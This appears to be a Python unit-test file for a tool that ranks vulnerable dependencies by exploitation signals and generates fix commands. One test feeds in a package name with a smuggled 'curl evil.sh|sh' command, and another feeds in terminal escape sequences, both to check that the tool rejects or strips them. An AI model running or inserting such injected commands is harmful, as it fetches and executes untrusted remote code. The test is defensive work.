import unittest

from patchqueue.model import new_finding
from patchqueue.rank import rank, rank_item

TODAY = "2026-10-26"


def item(id, pkg="lib", installed="1.0.0", fixed="1.0.1", eco="npm", **kw):
    loc = kw.pop("loc", {"file": "package-lock.json", "system": "web", "direct": True, "kind": "npm-lock"})
    return new_finding(id=id, package=pkg, installed=installed, fixed=fixed, ecosystem=eco,
                       locations=[loc], match_keys=kw.pop("keys", ["web"]), **kw)


def kev(added="2026-01-01", due="2026-01-22", ransomware=False):
    return {"date_added": added, "due_date": due, "ransomware": ransomware, "action": "Apply updates."}


class TierTests(unittest.TestCase):
    def ids(self, items, **kw):
        return [r["id"] for r in rank(items, today=TODAY, **kw)]

    def test_kev_beats_epss_beats_cvss(self):
        items = [
            item("CVE-2026-0003", cvss=10.0, epss=0.001),
            item("CVE-2026-0002", epss=0.50, cvss=5.0),
            item("CVE-2026-0001", kev=kev(), epss=0.02, cvss=4.0),
        ]
        ranked = rank(items, today=TODAY)
        self.assertEqual([r["id"] for r in ranked], ["CVE-2026-0001", "CVE-2026-0002", "CVE-2026-0003"])
        self.assertEqual([r["tier"] for r in ranked], [0, 1, 2])

    def test_kev_due_date_order_then_epss_then_cvss(self):
        items = [
            item("CVE-A", kev=kev(due="2026-03-01"), epss=0.99),
            item("CVE-B", kev=kev(due="2026-02-01"), epss=0.01),
            item("CVE-C", kev=kev(due="2026-02-01"), epss=0.50),
            item("CVE-D", kev=kev(due="2026-02-01"), epss=0.50, cvss=9.0),
        ]
        self.assertEqual(self.ids(items), ["CVE-D", "CVE-C", "CVE-B", "CVE-A"])

    def test_tier1_order_epss_then_cvss(self):
        items = [item("CVE-X", epss=0.2, cvss=5.0), item("CVE-Y", epss=0.2, cvss=9.0), item("CVE-Z", epss=0.9)]
        self.assertEqual(self.ids(items), ["CVE-Z", "CVE-Y", "CVE-X"])

    def test_ransomware_flag_reason(self):
        r = rank_item(item("CVE-R", kev=kev(ransomware=True)), today=TODAY)
        self.assertEqual(r["tier"], 0)
        self.assertIn("ransomware", r["why"])

    def test_major_bump_does_not_demote_tier0(self):
        r = rank_item(item("CVE-M", installed="2.10", fixed="3.1.3", eco="PyPI", kev=kev()), today=TODAY)
        self.assertEqual(r["tier"], 0)
        self.assertEqual(r["breaks"]["kind"], "major")
        self.assertIn("test in staging", r["breaks"]["label"])

    def test_no_fix_is_watching_and_says_so(self):
        r = rank_item(item("CVE-N", fixed=None, epss=0.9, cvss=9.8), today=TODAY)
        self.assertEqual(r["tier"], 3)
        self.assertIn("no fix yet", r["why"])
        self.assertEqual(r["fix_cmd"], "")
        self.assertIn("no fix yet", r["fix_note"])
        self.assertEqual(r["breaks"]["label"], "n/a — no fix yet")

    def test_no_fix_kev_flagged_and_first_in_watching(self):
        items = [item("CVE-LOW", fixed="1.0.1"), item("CVE-KEVNOFIX", fixed=None, kev=kev())]
        ranked = rank(items, today=TODAY)
        self.assertEqual(ranked[0]["id"], "CVE-KEVNOFIX")
        self.assertIn("CONFIRMED EXPLOITED", ranked[0]["why"])

    def test_cvss_pending_never_guessed(self):
        r = rank_item(item("CVE-P", epss=0.02), today=TODAY)
        self.assertEqual(r["tier"], 2)
        self.assertIn("CVSS pending", r["why"])
        self.assertIsNone(r["cvss"])


class ModifierTests(unittest.TestCase):
    def test_exposed_moves_up_one_tier(self):
        inv = {"web": {"exposed": True, "critical": False}}
        r = rank_item(item("CVE-E", epss=0.02), inventory=inv, today=TODAY)
        self.assertEqual(r["tier"], 1)
        self.assertIn("marked exposed", r["why"])
        r = rank_item(item("CVE-E2", epss=0.5), inventory=inv, today=TODAY)
        self.assertEqual(r["tier"], 0)

    def test_poc_plus_exposed_is_tier1_without_double_bump(self):
        inv = {"web": {"exposed": True}}
        r = rank_item(item("CVE-P", epss=0.001, poc=True), inventory=inv, today=TODAY)
        self.assertEqual(r["tier"], 1)
        r = rank_item(item("CVE-P2", epss=0.02, poc=True), inventory=inv, today=TODAY)
        self.assertEqual(r["tier"], 1)
        r = rank_item(item("CVE-P3", epss=0.001, poc=True), today=TODAY)  # not exposed
        self.assertEqual(r["tier"], 3)

    def test_exposure_does_not_promote_no_fix(self):
        r = rank_item(item("CVE-NF", fixed=None, epss=0.9), inventory={"web": {"exposed": True}}, today=TODAY)
        self.assertEqual(r["tier"], 3)

    def test_critical_is_tiebreaker_only(self):
        inv = {"db": {"critical": True}}
        a = item("CVE-1", epss=0.2, keys=["web"])
        b = item("CVE-2", epss=0.2, keys=["db"])
        ranked = rank([a, b], inventory=inv, today=TODAY)
        self.assertEqual([r["id"] for r in ranked], ["CVE-2", "CVE-1"])
        self.assertEqual({r["tier"] for r in ranked}, {1})


class DecisionTests(unittest.TestCase):
    def test_deferred_goes_to_watching_until_recheck(self):
        dec = {"CVE-D": {"status": "deferred", "reason": "upstream", "recheck": "2026-11-15", "at": "2026-10-20"}}
        r = rank_item(item("CVE-D", kev=kev()), decisions=dec, today=TODAY)
        self.assertEqual((r["tier"], r["status"], r["recheck"]), (3, "deferred", "2026-11-15"))
        r = rank_item(item("CVE-D", kev=kev()), decisions=dec, today="2026-11-16")
        self.assertEqual((r["tier"], r["status"]), (0, "defer_expired"))

    def test_not_affected_and_alias_match(self):
        dec = {"GHSA-AAAA-BBBB-CCCC": {"status": "not_affected", "reason": "function unused", "at": "2026-10-01"}}
        it = item("CVE-9", epss=0.5, aliases=["GHSA-aaaa-bbbb-cccc"])
        r = rank_item(it, decisions=dec, today=TODAY)
        self.assertEqual((r["tier"], r["status"]), (3, "not_affected"))
        self.assertIn("function unused", r["status_note"])

    def test_patched_but_still_present_is_not_hidden(self):
        dec = {"CVE-1": {"status": "patched", "at": "2026-10-01T00:00:00+00:00"}}
        r = rank_item(item("CVE-1", kev=kev()), decisions=dec, today=TODAY)
        self.assertEqual((r["tier"], r["status"]), (0, "patched_but_present"))

    def test_decision_scoped_to_package(self):
        dec = {"CVE-1": {"status": "not_affected", "reason": "x", "package": "other"}}
        r = rank_item(item("CVE-1", epss=0.5), decisions=dec, today=TODAY)
        self.assertEqual(r["status"], "open")


class CommandTests(unittest.TestCase):
    def test_npm_direct_and_transitive(self):
        r = rank_item(item("CVE-1", pkg="lodash", installed="4.17.15", fixed="4.17.21"), today=TODAY)
        self.assertEqual(r["fix_cmd"], "npm install lodash@4.17.21")
        t = item("CVE-2", pkg="minimist", loc={"file": "package-lock.json", "direct": False, "kind": "npm-lock"})
        r = rank_item(t, today=TODAY)
        self.assertTrue(r["fix_cmd"].startswith("npm update minimist"))
        self.assertIn("overrides", r["fix_note"])

    def test_malicious_package_name_gets_no_command(self):
        r = rank_item(item("CVE-1", pkg="x; curl evil.sh|sh", eco="PyPI",
                           loc={"file": "requirements.txt", "kind": "requirements"}), today=TODAY)
        self.assertEqual(r["fix_cmd"], "")
        self.assertIn("unexpected characters", r["fix_note"])

    def test_dir_with_spaces_is_quoted(self):
        r = rank_item(item("CVE-1", pkg="django", eco="PyPI", fixed="3.2.5",
                           loc={"file": "requirements.txt", "kind": "requirements", "dir": "/srv/my app"}), today=TODAY)
        self.assertEqual(r["fix_cmd"], "cd '/srv/my app' && pip install django==3.2.5")



class TerminalSafetyTests(unittest.TestCase):
    def test_escape_sequences_from_reports_are_stripped(self):
        from patchqueue import render
        evil = item("CVE-1\x1b]0;pwned\x07\x1b[2J", summary="hi\x1b[31m", fixed=None,
                    url="https://x\x9b31m")
        evil["package"] = "pkg\x1b[8m"
        ranked = rank([evil], today=TODAY)
        out = render.render_queue(ranked, [], {}, show_all=True) + render.render_queue(ranked, [], {})
        self.assertNotIn("\x1b", out)
        self.assertNotIn("\x07", out)
        self.assertNotIn("\x9b", out)


if __name__ == "__main__":
    unittest.main()
